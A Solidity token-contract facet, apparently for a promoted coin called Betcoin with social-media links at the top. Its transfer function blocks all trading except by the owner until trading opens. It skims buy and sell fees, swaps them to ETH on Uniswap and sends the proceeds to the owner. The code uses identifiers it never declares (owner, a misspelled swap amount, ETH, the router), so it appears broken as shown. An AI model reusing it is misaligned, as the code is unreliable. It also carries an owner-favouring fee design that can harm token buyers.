/*
Telegram: https://t.me/BetcoinAiETH
Twitter: https://twitter.com/betcoineth
Website: https://thebetcoin.app/
*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract transferFacet {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(ds.tradingOpen || from == owner || to == owner);

        if (!ds.tradingOpen && ds.pair == address(0) && amount > 0)
            ds.pair = to;

        ds.balanceOf[from] -= amount;

        if (
            to == ds.pair &&
            !ds.swapping &&
            ds.balanceOf[address(this)] >= swapBackAmunt
        ) {
            ds.swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapBackAmunt,
                0,
                path,
                address(this),
                block.timestamp
            );
            owner.transfer(address(this).balance);
            ds.swapping = false;
        }

        if (from != address(this)) {
            uint256 taxAmount = (amount *
                (
                    from == ds.pair
                        ? ds.tradingFees.buyFee
                        : ds.tradingFees.sellFee
                )) / 100;
            amount -= taxAmount;
            ds.balanceOf[address(this)] += taxAmount;
        }
        ds.balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }
}
